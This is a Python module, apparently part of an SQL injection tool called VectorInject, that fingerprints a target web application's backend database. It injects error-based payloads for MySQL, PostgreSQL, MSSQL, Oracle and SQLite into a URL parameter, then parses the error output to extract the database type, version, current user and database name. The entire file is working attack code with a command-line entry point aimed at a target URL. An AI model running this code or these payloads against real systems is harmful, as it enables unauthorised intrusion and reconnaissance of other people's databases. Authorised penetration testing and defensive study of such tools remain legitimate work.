"""
VectorInject - Fingerprint Module
Identifies the backend database type
"""

import sys
import os
import re

PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

import urllib.parse
from utils import colors, logger, payloads
from utils.http_client import HTTPClient
from config import settings


class Fingerprint:
    """Identifies backend database type"""
    
    def __init__(self, url, parameter, client=None):
        self.url = url
        self.parameter = parameter
        self.client = client or HTTPClient()
        self.logger = logger.get_logger("Fingerprint")
        self.database = None
        self.version = None
        self.user = None
        self.database_name = None
    
    def _build_url(self, payload):
        """Build URL with payload"""
        parsed = urllib.parse.urlparse(self.url)
        query_params = urllib.parse.parse_qs(parsed.query)
        original_value = query_params.get(self.parameter, [''])[0]
        query_params[self.parameter] = [original_value + payload]
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        new_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
        return new_url
    
    def _extract_from_error(self, content, regex_pattern):
        """Extract data from error message using regex"""
        match = re.search(regex_pattern, content, re.IGNORECASE)
        if match:
            return match.group(1).strip()
        return None
    
    # ============================================================
    # Database Type Detection
    # ============================================================
    
    def identify_database(self):
        """Identify database type using error messages"""
        colors.info("Identifying database type...")
        
        # Test payload that triggers version error
        test_payload = "' AND extractvalue(1, concat(0x7e, version()))--"
        test_url = self._build_url(test_payload)
        result = self.client.get(test_url)
        
        if result['error']:
            colors.warning("Connection failed")
            return None
        
        content = result['content']
        
        # Check for database signatures
        for db_type, signatures in settings.DATABASE_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in content.lower():
                    colors.success(f"Database identified: {db_type}")
                    self.database = db_type
                    return db_type
        
        # Try different payloads for specific DBs
        colors.info("Trying alternative detection methods...")
        
        # MySQL
        mysql_payload = "' AND updatexml(1, concat(0x7e, version()), 1)--"
        mysql_url = self._build_url(mysql_payload)
        mysql_result = self.client.get(mysql_url)
        if 'XPATH syntax error' in mysql_result['content']:
            colors.success("Database identified: MySQL")
            self.database = "MySQL"
            return "MySQL"
        
        # PostgreSQL
        pg_payload = "' AND 1=CAST(version() AS int)--"
        pg_url = self._build_url(pg_payload)
        pg_result = self.client.get(pg_url)
        if 'invalid input syntax' in pg_result['content'].lower() or 'postgresql' in pg_result['content'].lower():
            colors.success("Database identified: PostgreSQL")
            self.database = "PostgreSQL"
            return "PostgreSQL"
        
        # MSSQL
        mssql_payload = "' AND 1=CONVERT(int, @@version)--"
        mssql_url = self._build_url(mssql_payload)
        mssql_result = self.client.get(mssql_url)
        if 'microsoft' in mssql_result['content'].lower() or 'sql server' in mssql_result['content'].lower():
            colors.success("Database identified: MSSQL")
            self.database = "MSSQL"
            return "MSSQL"
        
        # Oracle
        oracle_payload = "' AND 1=UTL_INADDR.get_host_address('a')--"
        oracle_url = self._build_url(oracle_payload)
        oracle_result = self.client.get(oracle_url)
        if 'ora-' in oracle_result['content'].lower():
            colors.success("Database identified: Oracle")
            self.database = "Oracle"
            return "Oracle"
        
        # SQLite
        sqlite_payload = "' AND 1=sqlite_version()--"
        sqlite_url = self._build_url(sqlite_payload)
        sqlite_result = self.client.get(sqlite_url)
        if 'sqlite' in sqlite_result['content'].lower():
            colors.success("Database identified: SQLite")
            self.database = "SQLite"
            return "SQLite"
        
        colors.warning("Could not identify database type")
        return None
    
    # ============================================================
    # Extract Version
    # ============================================================
    
    def get_version(self):
        """Extract database version"""
        colors.info("Extracting database version...")
        
        if self.database == "MySQL":
            payload = "' AND extractvalue(1, concat(0x7e, version()))--"
            pattern = r'XPATH syntax error: \'~([^\']+)\''
        elif self.database == "PostgreSQL":
            payload = "' AND 1=CAST(version() AS int)--"
            pattern = r'invalid input syntax for integer: "([^"]+)"'
        elif self.database == "MSSQL":
            payload = "' AND 1=CONVERT(int, @@version)--"
            pattern = r'Conversion failed when converting the nvarchar value \'([^\']+)\''
        elif self.database == "Oracle":
            payload = "' AND 1=UTL_INADDR.get_host_address(version())--"
            pattern = r'ORA-\d+: ([^\n]+)'
        elif self.database == "SQLite":
            payload = "' AND 1=CAST(sqlite_version() AS int)--"
            pattern = r'([\d.]+)'
        else:
            colors.warning("Unknown database, skipping version extraction")
            return None
        
        test_url = self._build_url(payload)
        result = self.client.get(test_url)
        
        if result['error']:
            return None
        
        version = self._extract_from_error(result['content'], pattern)
        if version:
            colors.success(f"Version: {version}")
            self.version = version
            return version
        
        return None
    
    # ============================================================
    # Extract Current User
    # ============================================================
    
    def get_user(self):
        """Extract current database user"""
        colors.info("Extracting database user...")
        
        if self.database == "MySQL":
            payload = "' AND extractvalue(1, concat(0x7e, user()))--"
            pattern = r'XPATH syntax error: \'~([^\']+)\''
        elif self.database == "PostgreSQL":
            payload = "' AND 1=CAST(current_user AS int)--"
            pattern = r'invalid input syntax for integer: "([^"]+)"'
        elif self.database == "MSSQL":
            payload = "' AND 1=CONVERT(int, SYSTEM_USER)--"
            pattern = r'Conversion failed when converting the nvarchar value \'([^\']+)\''
        else:
            return None
        
        test_url = self._build_url(payload)
        result = self.client.get(test_url)
        
        if result['error']:
            return None
        
        user = self._extract_from_error(result['content'], pattern)
        if user:
            colors.success(f"User: {user}")
            self.user = user
            return user
        
        return None
    
    # ============================================================
    # Extract Current Database Name
    # ============================================================
    
    def get_database_name(self):
        """Extract current database name"""
        colors.info("Extracting database name...")
        
        if self.database == "MySQL":
            payload = "' AND extractvalue(1, concat(0x7e, database()))--"
            pattern = r'XPATH syntax error: \'~([^\']+)\''
        elif self.database == "PostgreSQL":
            payload = "' AND 1=CAST(current_database() AS int)--"
            pattern = r'invalid input syntax for integer: "([^"]+)"'
        elif self.database == "MSSQL":
            payload = "' AND 1=CONVERT(int, DB_NAME())--"
            pattern = r'Conversion failed when converting the nvarchar value \'([^\']+)\''
        else:
            return None
        
        test_url = self._build_url(payload)
        result = self.client.get(test_url)
        
        if result['error']:
            return None
        
        db_name = self._extract_from_error(result['content'], pattern)
        if db_name:
            colors.success(f"Database: {db_name}")
            self.database_name = db_name
            return db_name
        
        return None
    
    # ============================================================
    # Main Fingerprint Function
    # ============================================================
    
    def fingerprint(self):
        """Full fingerprinting process"""
        colors.section(f"Fingerprinting: {self.parameter}")
        
        result = {
            'database': None,
            'version': None,
            'user': None,
            'database_name': None
        }
        
        # Step 1: Identify database
        db_type = self.identify_database()
        result['database'] = db_type
        
        if not db_type:
            colors.error("Could not fingerprint database")
            return result
        
        # Step 2: Get version
        version = self.get_version()
        result['version'] = version
        
        # Step 3: Get user
        user = self.get_user()
        result['user'] = user
        
        # Step 4: Get database name
        db_name = self.get_database_name()
        result['database_name'] = db_name
        
        # Summary
        colors.section("Fingerprint Summary")
        print(f"  Database:       {result['database'] or 'Unknown'}")
        print(f"  Version:        {result['version'] or 'Unknown'}")
        print(f"  User:           {result['user'] or 'Unknown'}")
        print(f"  Database Name:  {result['database_name'] or 'Unknown'}")
        
        return result


def fingerprint_target(url, parameter):
    """Convenience function"""
    fp = Fingerprint(url, parameter)
    return fp.fingerprint()


if __name__ == "__main__":
    if len(sys.argv) > 2:
        fingerprint_target(sys.argv[1], sys.argv[2])
    else:
        print("Usage: python3 fingerprint.py <URL> <PARAMETER>")
        print("Example: python3 fingerprint.py 'http://target.com/page.php?id=1' id")
